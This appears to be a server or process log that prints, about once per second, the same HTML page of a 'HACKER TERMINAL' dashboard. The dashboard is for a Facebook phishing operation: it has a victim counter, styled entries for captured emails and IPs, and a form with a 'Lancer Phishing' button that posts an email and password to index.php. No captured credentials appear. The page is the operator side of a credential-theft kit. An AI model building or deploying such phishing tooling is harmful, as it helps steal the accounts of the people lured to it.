06:39:20 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:20 -     </div>
06:39:20 -     <div class="console" id="console">
06:39:20 -             </div>
06:39:20 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:20 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:20 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:20 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:20 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:20 -     </form>
06:39:20 -     <script>
06:39:20 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:20 -     </script>
06:39:20 - </body>
06:39:20 - </html>
06:39:21 - <!DOCTYPE html>
06:39:21 - <html>
06:39:21 - <head>
06:39:21 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:21 -     <meta http-equiv="refresh" content="5">
06:39:21 -     <style>
06:39:21 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:21 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:21 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:21 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:21 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:21 -         .email{color:#ff0;font-weight:bold;}
06:39:21 -         .ip{color:#0ff;}
06:39:21 -         .time{color:#ff6600;}
06:39:21 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:21 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:21 -         .btn:hover{background:#0a0;}
06:39:21 -         .btn-red{background:#f00;color:#fff;}
06:39:21 -     </style>
06:39:21 - </head>
06:39:21 - <body>
06:39:21 -     <div class="header">
06:39:21 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:21 -     </div>
06:39:21 -     <div class="console" id="console">
06:39:21 -             </div>
06:39:21 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:21 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:21 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:21 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:21 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:21 -     </form>
06:39:21 -     <script>
06:39:21 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:21 -     </script>
06:39:21 - </body>
06:39:21 - </html>
06:39:22 - <!DOCTYPE html>
06:39:22 - <html>
06:39:22 - <head>
06:39:22 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:22 -     <meta http-equiv="refresh" content="5">
06:39:22 -     <style>
06:39:22 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:22 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:22 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:22 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:22 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:22 -         .email{color:#ff0;font-weight:bold;}
06:39:22 -         .ip{color:#0ff;}
06:39:22 -         .time{color:#ff6600;}
06:39:22 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:22 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:22 -         .btn:hover{background:#0a0;}
06:39:22 -         .btn-red{background:#f00;color:#fff;}
06:39:22 -     </style>
06:39:22 - </head>
06:39:22 - <body>
06:39:22 -     <div class="header">
06:39:22 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:22 -     </div>
06:39:22 -     <div class="console" id="console">
06:39:22 -             </div>
06:39:22 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:22 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:22 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:22 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:22 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:22 -     </form>
06:39:22 -     <script>
06:39:22 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:22 -     </script>
06:39:22 - </body>
06:39:22 - </html>
06:39:23 - <!DOCTYPE html>
06:39:23 - <html>
06:39:23 - <head>
06:39:23 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:23 -     <meta http-equiv="refresh" content="5">
06:39:23 -     <style>
06:39:23 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:23 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:23 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:23 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:23 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:24 -         .email{color:#ff0;font-weight:bold;}
06:39:24 -         .ip{color:#0ff;}
06:39:24 -         .time{color:#ff6600;}
06:39:24 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:24 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:24 -         .btn:hover{background:#0a0;}
06:39:24 -         .btn-red{background:#f00;color:#fff;}
06:39:24 -     </style>
06:39:24 - </head>
06:39:24 - <body>
06:39:24 -     <div class="header">
06:39:24 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:24 -     </div>
06:39:24 -     <div class="console" id="console">
06:39:24 -             </div>
06:39:24 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:24 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:24 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:24 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:24 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:24 -     </form>
06:39:24 -     <script>
06:39:24 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:24 -     </script>
06:39:24 - </body>
06:39:24 - </html>
06:39:25 - <!DOCTYPE html>
06:39:25 - <html>
06:39:25 - <head>
06:39:25 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:25 -     <meta http-equiv="refresh" content="5">
06:39:25 -     <style>
06:39:25 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:25 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:25 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:25 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:25 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:25 -         .email{color:#ff0;font-weight:bold;}
06:39:25 -         .ip{color:#0ff;}
06:39:25 -         .time{color:#ff6600;}
06:39:25 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:25 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:25 -         .btn:hover{background:#0a0;}
06:39:25 -         .btn-red{background:#f00;color:#fff;}
06:39:25 -     </style>
06:39:25 - </head>
06:39:25 - <body>
06:39:25 -     <div class="header">
06:39:25 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:25 -     </div>
06:39:25 -     <div class="console" id="console">
06:39:25 -             </div>
06:39:25 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:25 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:25 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:25 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:25 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:25 -     </form>
06:39:25 -     <script>
06:39:25 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:25 -     </script>
06:39:25 - </body>
06:39:25 - </html>
06:39:26 - <!DOCTYPE html>
06:39:26 - <html>
06:39:26 - <head>
06:39:26 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:26 -     <meta http-equiv="refresh" content="5">
06:39:26 -     <style>
06:39:26 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:26 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:26 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:26 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:26 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:26 -         .email{color:#ff0;font-weight:bold;}
06:39:26 -         .ip{color:#0ff;}
06:39:26 -         .time{color:#ff6600;}
06:39:26 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:26 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:26 -         .btn:hover{background:#0a0;}
06:39:26 -         .btn-red{background:#f00;color:#fff;}
06:39:26 -     </style>
06:39:26 - </head>
06:39:26 - <body>
06:39:26 -     <div class="header">
06:39:26 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:26 -     </div>
06:39:26 -     <div class="console" id="console">
06:39:26 -             </div>
06:39:26 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:26 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:26 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:26 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:26 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:26 -     </form>
06:39:26 -     <script>
06:39:26 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:26 -     </script>
06:39:26 - </body>
06:39:26 - </html>
06:39:27 - <!DOCTYPE html>
06:39:27 - <html>
06:39:27 - <head>
06:39:27 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:27 -     <meta http-equiv="refresh" content="5">
06:39:27 -     <style>
06:39:27 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:27 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:27 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:27 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:27 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:27 -         .email{color:#ff0;font-weight:bold;}
06:39:27 -         .ip{color:#0ff;}
06:39:27 -         .time{color:#ff6600;}
06:39:27 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:27 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:27 -         .btn:hover{background:#0a0;}
06:39:27 -         .btn-red{background:#f00;color:#fff;}
06:39:27 -     </style>
06:39:27 - </head>
06:39:27 - <body>
06:39:27 -     <div class="header">
06:39:27 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:27 -     </div>
06:39:27 -     <div class="console" id="console">
06:39:27 -             </div>
06:39:27 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:27 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:27 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:27 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:27 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:27 -     </form>
06:39:27 -     <script>
06:39:27 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:27 -     </script>
06:39:27 - </body>
06:39:27 - </html>
06:39:28 - <!DOCTYPE html>
06:39:28 - <html>
06:39:28 - <head>
06:39:28 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:28 -     <meta http-equiv="refresh" content="5">
06:39:28 -     <style>
06:39:28 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:28 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:28 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:28 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:28 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:28 -         .email{color:#ff0;font-weight:bold;}
06:39:28 -         .ip{color:#0ff;}
06:39:28 -         .time{color:#ff6600;}
06:39:28 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:28 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:28 -         .btn:hover{background:#0a0;}
06:39:28 -         .btn-red{background:#f00;color:#fff;}
06:39:28 -     </style>
06:39:28 - </head>
06:39:28 - <body>
06:39:28 -     <div class="header">
06:39:28 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:28 -     </div>
06:39:28 -     <div class="console" id="console">
06:39:28 -             </div>
06:39:28 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:28 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:28 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:28 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:28 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:28 -     </form>
06:39:28 -     <script>
06:39:28 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:28 -     </script>
06:39:28 - </body>
06:39:28 - </html>
06:39:29 - <!DOCTYPE html>
06:39:29 - <html>
06:39:29 - <head>
06:39:29 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:29 -     <meta http-equiv="refresh" content="5">
06:39:29 -     <style>
06:39:29 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:29 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:29 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:29 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:29 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:29 -         .email{color:#ff0;font-weight:bold;}
06:39:29 -         .ip{color:#0ff;}
06:39:29 -         .time{color:#ff6600;}
06:39:29 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:29 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:29 -         .btn:hover{background:#0a0;}
06:39:29 -         .btn-red{background:#f00;color:#fff;}
06:39:29 -     </style>
06:39:29 - </head>
06:39:29 - <body>
06:39:29 -     <div class="header">
06:39:29 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:29 -     </div>
06:39:29 -     <div class="console" id="console">
06:39:29 -             </div>
06:39:29 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:29 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:29 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:29 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:29 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:29 -     </form>
06:39:29 -     <script>
06:39:29 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:29 -     </script>
06:39:29 - </body>
06:39:29 - </html>
06:39:30 - <!DOCTYPE html>
06:39:30 - <html>
06:39:30 - <head>
06:39:30 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:30 -     <meta http-equiv="refresh" content="5">
06:39:30 -     <style>
06:39:30 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:30 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:30 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:30 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:30 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:30 -         .email{color:#ff0;font-weight:bold;}
06:39:30 -         .ip{color:#0ff;}
06:39:30 -         .time{color:#ff6600;}
06:39:30 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:30 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:30 -         .btn:hover{background:#0a0;}
06:39:30 -         .btn-red{background:#f00;color:#fff;}
06:39:30 -     </style>
06:39:30 - </head>
06:39:30 - <body>
06:39:30 -     <div class="header">
06:39:30 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:30 -     </div>
06:39:30 -     <div class="console" id="console">
06:39:30 -             </div>
06:39:30 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:30 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:30 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:30 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:30 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:30 -     </form>
06:39:30 -     <script>
06:39:30 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:30 -     </script>
06:39:30 - </body>
06:39:30 - </html>
06:39:31 - <!DOCTYPE html>
06:39:31 - <html>
06:39:31 - <head>
06:39:31 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:31 -     <meta http-equiv="refresh" content="5">
06:39:31 -     <style>
06:39:31 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:31 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:31 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:31 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:31 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:31 -         .email{color:#ff0;font-weight:bold;}
06:39:31 -         .ip{color:#0ff;}
06:39:31 -         .time{color:#ff6600;}
06:39:31 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:31 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:31 -         .btn:hover{background:#0a0;}
06:39:31 -         .btn-red{background:#f00;color:#fff;}
06:39:31 -     </style>
06:39:31 - </head>
06:39:31 - <body>
06:39:31 -     <div class="header">
06:39:31 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:31 -     </div>
06:39:31 -     <div class="console" id="console">
06:39:31 -             </div>
06:39:31 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:31 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:31 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:31 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:31 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:31 -     </form>
06:39:31 -     <script>
06:39:31 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:31 -     </script>
06:39:31 - </body>
06:39:31 - </html>
06:39:32 - <!DOCTYPE html>
06:39:32 - <html>
06:39:33 - <head>
06:39:33 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:33 -     <meta http-equiv="refresh" content="5">
06:39:33 -     <style>
06:39:33 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:33 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:33 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:33 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:33 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:33 -         .email{color:#ff0;font-weight:bold;}
06:39:33 -         .ip{color:#0ff;}
06:39:33 -         .time{color:#ff6600;}
06:39:33 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:33 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:33 -         .btn:hover{background:#0a0;}
06:39:33 -         .btn-red{background:#f00;color:#fff;}
06:39:33 -     </style>
06:39:33 - </head>
06:39:33 - <body>
06:39:33 -     <div class="header">
06:39:33 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:33 -     </div>
06:39:33 -     <div class="console" id="console">
06:39:33 -             </div>
06:39:33 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:33 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:33 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:33 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:33 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:33 -     </form>
06:39:33 -     <script>
06:39:33 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:33 -     </script>
06:39:33 - </body>
06:39:33 - </html>
06:39:34 - <!DOCTYPE html>
06:39:34 - <html>
06:39:34 - <head>
06:39:34 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:34 -     <meta http-equiv="refresh" content="5">
06:39:34 -     <style>
06:39:34 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:34 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:34 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:34 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:34 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:34 -         .email{color:#ff0;font-weight:bold;}
06:39:34 -         .ip{color:#0ff;}
06:39:34 -         .time{color:#ff6600;}
06:39:34 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:34 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:34 -         .btn:hover{background:#0a0;}
06:39:34 -         .btn-red{background:#f00;color:#fff;}
06:39:34 -     </style>
06:39:34 - </head>
06:39:34 - <body>
06:39:34 -     <div class="header">
06:39:34 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:34 -     </div>
06:39:34 -     <div class="console" id="console">
06:39:34 -             </div>
06:39:34 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:34 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:34 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:34 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:34 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:34 -     </form>
06:39:34 -     <script>
06:39:34 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:34 -     </script>
06:39:34 - </body>
06:39:34 - </html>
06:39:35 - <!DOCTYPE html>
06:39:35 - <html>
06:39:35 - <head>
06:39:35 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:35 -     <meta http-equiv="refresh" content="5">
06:39:35 -     <style>
06:39:35 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:35 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:35 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:35 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:35 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:35 -         .email{color:#ff0;font-weight:bold;}
06:39:35 -         .ip{color:#0ff;}
06:39:35 -         .time{color:#ff6600;}
06:39:35 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:35 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:35 -         .btn:hover{background:#0a0;}
06:39:35 -         .btn-red{background:#f00;color:#fff;}
06:39:35 -     </style>
06:39:35 - </head>
06:39:35 - <body>
06:39:35 -     <div class="header">
06:39:35 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:35 -     </div>
06:39:35 -     <div class="console" id="console">
06:39:35 -             </div>
06:39:35 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:35 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:35 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:35 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:35 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:35 -     </form>
06:39:35 -     <script>
06:39:35 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:35 -     </script>
06:39:35 - </body>
06:39:35 - </html>
06:39:36 - <!DOCTYPE html>
06:39:36 - <html>
06:39:36 - <head>
06:39:36 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:36 -     <meta http-equiv="refresh" content="5">
06:39:36 -     <style>
06:39:36 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:36 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:36 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:36 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
